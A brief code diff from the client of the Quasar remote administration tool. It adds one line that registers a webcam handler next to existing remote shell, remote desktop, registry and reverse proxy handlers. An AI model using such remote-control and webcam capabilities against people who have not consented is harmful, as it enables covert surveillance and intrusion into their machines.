@@ -193,6 +193,7 @@ namespace Quasar.Client
             _messageProcessors.Add(new RegistryHandler());
             _messageProcessors.Add(new RemoteDesktopHandler());
             _messageProcessors.Add(new RemoteShellHandler(client));
+			_messageProcessors.Add(new WebcamHandler());
             _messageProcessors.Add(new ReverseProxyHandler(client));
             _messageProcessors.Add(new ShutdownHandler());
             _messageProcessors.Add(new StartupManagerHandler());
